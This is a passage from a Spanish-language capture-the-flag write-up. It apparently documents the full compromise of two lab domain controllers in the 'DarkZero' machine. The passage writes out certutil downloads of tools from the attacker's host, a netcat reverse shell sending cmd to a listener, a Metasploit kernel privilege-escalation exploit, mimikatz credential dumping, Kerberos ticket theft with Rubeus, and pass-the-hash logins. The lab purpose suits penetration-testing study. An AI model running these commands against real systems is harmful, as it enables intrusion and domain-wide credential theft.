Server username: darkzero-ext\svc_sql
meterpreter > sysinfo
Computer        : DC02
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : en_US
Domain          : darkzero-ext
Logged On Users : 9
Meterpreter     : x64/windows
```
Ya tenemos una sesión de **Meterpreter**.

#### Utilizando Binario nc.exe para Obtener Sesión de Máquina AD2 {#BinarioNC}

También podemos obtener una sesión normal con **rlwrap** utilizando el binario **nc.exe**.

Dentro de **Kali** ya tenemos este binario, solamente es cuestión de buscarlo y copiarlo en nuestro directorio de trabajo:
```bash
locate nc.exe
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe

cp /usr/share/windows-resources/binaries/nc.exe .
```

Ya solo debemos mandar este binario a la **máquina AD2**, de la misma forma que hicimos con la **Reverse Shell de Meterpreter**:
```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "certutil.exe -urlcache -split -f http://Tu_IP/nc.exe C:\Temp\nc.exe"
output                                                
...
CertUtil: -URLCache command completed successfully.
```
Ya lo cargamos.

Abre un listener con **rlwrap** y **netcat**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Ejecuta el binario **nc.exe** indicándole que mande una **CMD** a tu máquina:
```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "C:\Temp\nc.exe -e cmd Tu_IP 443"
```

Observa la **netcat**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.89] 59846
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
darkzero-ext\svc_sql
```
Estamos dentro otra vez.

### Probando Módulo: cve_2024_30088_authz_basep para Escalar Privilegios en Máquina AD2 y Obteniendo los Hashes NTLM con Módulo Kiwi {#PrivescAD2}

Al usar una sesión normal, es decir, sin usar **Meterpreter** ni **Metasploit**, intenté identificar alguna vulnerabilidad usando **winPEASx64**, **adPEAS** y **Windows Exploit Suggester**, pero no logré identificar alguna.

Entonces, usaremos la sesión que ya tenemos de **Meterpreter** en **Metasploit** y el módulo `post/multi/recon/local_exploit_suggester` para ver si identifica alguna vulnerabilidad en el sistema.

Carguemos el módulo a **Metasploit**:
```bash
msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) >
```

Configúralo y ejecútalo:
```bash
msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf post(multi/recon/local_exploit_suggester) > exploit
[*] 172.16.20.2 - Collecting local exploits for x64/windows..
...
[*] 172.16.20.2 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
 6   exploit/windows/local/cve_2024_30085_cloud_files               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
...
```
Tenemos 9 Exploits que podemos probar, pero el que a mí me funcionó fue el **cve_2024_30088_authz_basep**.

Así que vamos a cargarlo y a configurarlo:
```bash
msf exploit(multi/handler) > use exploit/windows/local/cve_2024_30088_authz_basep
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/cve_2024_30088_authz_basep) > set SESSION 1
SESSION => 1
msf exploit(windows/local/cve_2024_30088_authz_basep) > set LHOST tun0
LHOST => Tu_IP
msf exploit(windows/local/cve_2024_30088_authz_basep) > set LPORT 4242
LPORT => 4242
msf exploit(windows/local/cve_2024_30088_authz_basep) > set AutoCheck false
AutoCheck => false
msf exploit(windows/local/cve_2024_30088_authz_basep) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
PAYLOAD => windows/x64/meterpreter_reverse_tcp
```
Es muy importante que cambies el payload, ya que si ocupas otro, es posible que tu sesión de **Meterpreter** muera y tendrás que obtener una nueva.

Ejecutemos el Exploit:
```bash
msf exploit(windows/local/cve_2024_30088_authz_basep) > exploit
[*] Started reverse TCP handler on Tu_IP:4242 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Reflectively injecting the DLL into 71776...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 788
[+] Successfully retrieved winlogon pid: 588
[*] Meterpreter session 6 opened (Tu_IP:4242 -> 10.10.11.89:59915) at 2025-10-12 16:19:20 -0600

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Excelente, ya somos el **Administrador**.

Encontraremos la flag del usuario en el escritorio del **Administrador**:
```bash
meterpreter > shell
Process 1084 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type user.txt
type user.txt
...
```
La tenemos.

Y aprovechando esta sesión, obtengamos el **hash NTLM** del **Administrador** con el módulo **Kiwi**.

Carga el módulo **Kiwi**:
```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

Obtengamos las contraseñas:
```bash
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain        NTLM    SHA1    DPAPI
--------       ------        ----    ----    -----
Administrator  darkzero-ext  696...  935...  07f...
...
```
Ahí tenemos los **hashes NTLM**.

Si queremos, podemos obtener una sesión con **psexec** desde nuestra máquina, pero sería necesario aplicar **Reverse Port Forwarding**.

Lo haremos a continuación, pero es totalmente opcional.

### Opcional: Realizando Reverse Port Forwarding con Chisel para Conectarnos a Máquina AD2 con psexec (Pivoting) {#Pivot}

Para hacer esto, utilizaremos **chisel** que puedes descargar en el siguiente link:
* <a href="https://github.com/jpillora/chisel" target="_blank">Repositorio de jpillora: Chisel</a>

Debes descargar la versión para **Windows (chisel...windows_amd64.zip )** y para **Linux (chisel...linux_amd64.gz )**. Recuerda descomprimirlas una vez que las tengas.

Una vez que tengas la de **Windows**, abre un servidor con **python3**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Mandamos **chisel** al **AD2** usando el comando **certutil**:
```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "certutil.exe -urlcache -split -f http://Tu_IP/chisel.exe C:\Temp\chisel.exe"
output                                                
---------------------------------------------------   
****  Online  ****                                    

  000000  ...                                         

  a1ee00                                              

CertUtil: -URLCache command completed successfully.
```
Comencemos a aplicar el **Reverse Port Forwarding**.

Primero, alcemos el servidor con **Chisel** para **Linux** en nuestra máquina:
```bash
./chisel server -p 4444 --reverse
2025/10/12 13:46:20 server: Reverse tunnelling enabled
2025/10/12 13:46:20 server: Fingerprint ...
2025/10/12 13:46:20 server: Listening on http://0.0.0.0:4444
```

Desde el **AD2**, usemos **Chisel** como cliente para conectarnos al **servidor de Chisel** de nuestra máquina, siendo aquí donde aplicamos el **Reverse Port Forwarding**. 

Pero antes de eso, debemos identificar qué puertos serían útiles para que tengamos acceso desde nuestra máquina.

Si queremos usar la herramienta **psexec**, debemos tener acceso al **puerto 445 y 135** (este último es "opcional", pero es posible que la herramienta lo necesite, por lo que es mejor tenerlo presente).

Entonces, debemos indicarlo al momento de conectarnos al **servidor de Chisel**:
```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell "C:\Temp\chisel.exe client Tu_IP:4444 R:1445:172.16.20.2:445 R:1337:172.16.20.2:135"
```
Bien, usamos nuestro **puerto 1445** para el **puerto 445** de la **máquina AD2** y el **puerto 1337** para el **puerto 135**.

Podemos comprobar que tenemos acceso al **servicio SMB** de la **máquina AD2**, si usamos **netexec** para que acceda a este servicio:
```bash
nxc smb 127.0.0.1 --port 1445
SMB         127.0.0.1       1445   DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:darkzero.ext) (signing:True) (SMBv1:False)
```
Funciona.

Ya podemos usar **psexec** en conjunto con **socat** (este lo usamos para indicar el puerto que usamos para el **servicio SMB**) para ganar acceso a la **máquina AD2**:
```bash
socat TCP-LISTEN:445,reuseaddr,fork TCP:127.0.0.1:1445 & impacket-psexec Administrator@127.0.0.1 -hashes :6963aa...
[1] 378518
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file IAPRzjbg.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service hfYa on 127.0.0.1.....
[*] Starting service hfYa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

## Post Explotación {#Post}

### Capturando Ticket Granting Ticket (TGT) con Rubeus.exe y Dumpeando Secrets con secretsdump de Impacket para Escalar Privilegios {#Rubeus}

Ya escalamos privilegios en la **máquina AD2**, pero aún no hemos escalado privilegios en la **máquina AD1**, que es la que nos interesa.

El problema es que no podemos usar el **Hash NTLM** del **Administrador** de la **máquina AD2** para escalar privilegios, por lo que tenemos que buscar una forma diferente.

Recordemos que el **servicio MSSQL** está enlazado al **AD2**, que pensando un poco cómo funciona cuando hacemos la conexión, sería algo similar a lo siguiente:
* La **máquina AD1** (**DC01.darkzero.htb**) hace una petición al **AD2** (**DC02.darkzero.ext**), ya sea una simple consulta hasta una conexión directa para obtener una sesión.
* Para que la conexión suceda, el **AD1** necesita autenticarse al **AD2**, así que, si utilizan el **servicio Kerberos** para autenticarse, se tramita un **TGT**.
* El **KDC** asigna y da el **TGT** al **AD1**, lo que permite la consulta o conexión al **AD2**.
* Es en este momento donde **Rubeus.exe** (en modo monitor) captura el **TGT** del **AD1** desde el **AD2**, pues el **AD2** lo solicita para el servicio solicitado y lo guarda localmente.

 y es aquí donde podríamos encontrar un **TGT** del **AD1**.

Para que podamos capturar ese **TGT**, podemos utilizar la herramienta **Rubeus.exe**, que puedes descargar en el siguiente link:
* <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" target="_blank">Repositorio de r3motecontrol: Ghostpack-CompiledBinaries</a>

Para que funcione **Rubeus.exe**, necesita usarse con un usuario con privilegios de **Administrador**, así que la usaremos en nuestra sesión del **AD2**.

Carga **Rubeus.exe** al **AD2**:
```bash
C:\Temp> certutil.exe -urlcache -split -f http://Tu_IP/Rubeus.exe Rubeus.exe        
****  Online  ****
  000000  ...
  06d200
CertUtil: -URLCache command completed successfully.
```

Activa **Rubeus.exe** en **modo monitor** para que capture un **TGT**:
```bash
C:\Temp> rubeus.exe monitor /interval:1 /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 

  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: TGT Monitoring
[*] Monitoring every 1 seconds for new TGTs
```

Tan solo tenemos que hacer una consulta desde el **servicio MSSQL** del **AD1** al **AD2**:
```bash
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\testing
```

Observa que **Rubeus.exe** capturó varios **TGT**, pero uno de estos es del **AD1**:
```bash
[*] Monitoring every 1 seconds for new TGTs

[*] 10/11/2025 7:22:03 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/11/2025 12:22:02 PM
  EndTime               :  10/11/2025 10:22:01 PM
  RenewTill             :  10/18/2025 12:22:01 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDA...
```
Usaremos este **TGT** codificado en **base64**.

Lo guardamos y luego decodificamos el ticket, guardando el resultado en otro archivo:
```bash
nano ticket.bs4.kirbi

cat ticket.bs4.kirbi | base64 -d > ticket.kirbi
```
Nuestro **TGT** ahora está en el archivo **ticket.kirbi**.

Usaremos **impacket-ticketConverter** para convertir el archivo **ticket.kirbi** en formato **ccache** dentro de un archivo:
```bash
impacket-ticketConverter ticket.kirbi dc01_admin.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

Cargamos el **archivo ccache** como variable de entorno y revisamos con el comando **klist** que ya esté cargado:
```bash
export KRB5CCNAME=dc01_admin.ccache

klist
Ticket cache: FILE:dc01_admin.ccache
Default principal: DC01$@DARKZERO.HTB

Valid starting     Expires            Service principal
11/10/25 13:22:02  11/10/25 23:22:01  krbtgt/DARKZERO.HTB@DARKZERO.HTB
	renew until 18/10/25 13:22:01
```
Observa que el **TGT** está cargado para usarse en el **AD1**, siendo esta forma correcta.

Recuerda que para que funcione cualquier herramienta ante el **AD**, necesitamos estar dentro de la misma zona horaria.

Primero, agrega la IP de la máquina víctima al archivo `/etc/resolv.conf`:
```bash
nano /etc/resolv.conf
---------------------
# Generated by NetworkManager
nameserver 10.10.11.89
```
En este punto también debemos tener agregado el dominio al archivo `/etc/hosts`.

Si lo configuramos correctamente, debería poder resolvernos una consulta al dominio con **nslookup**:
```bash
nslookup DC01.darkzero.htb
Server:		10.10.11.89
Address:	10.10.11.89#53

Name:	DC01.darkzero.htb
Address: 172.16.20.1
Name:	DC01.darkzero.htb
Address: 10.10.11.89
```
Ahí está, funciona correctamente.

Ya solo falta entrar a la misma zona horaria, que puedes hacerlo con el comando **ntpdate** o **rdate** apuntando al dominio del **AD1**:
```bash
ntpdate -u DC01.darkzero.htb
2025-10-11 13:55:18.968419 (-0600) +25202.290225 +/- 0.038414 DC01.darkzero.htb 10.10.11.89 s1 no-leap
CLOCK: time stepped by 25202.290225

rdate -n DC01.darkzero.htb
Sat Oct 11 14:12:19 CST 2025
```
Revisa que estés en el mismo horario.

Ya con esto, podemos dumpear los **Hashes NTLM** con la herramienta **impacket-secretsdump**:
```bash
impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435
```
Muy bien, tenemos los Hashes y entre ellos el del **administrador**.

Aprovechemos que está activo el **servicio WinRM** para utilizar la herramienta **evil-winRM** y autenticarnos usando el **Hash NTLM** del **administrador**:
```bash
evil-winrm -i 10.10.11.89 -u administrator -H 591750...
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
darkzero\administrator
```
Muy bien, estamos dentro.

Solo falta encontrar la última flag:
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
...
```
Y con esto, terminamos la máquina.
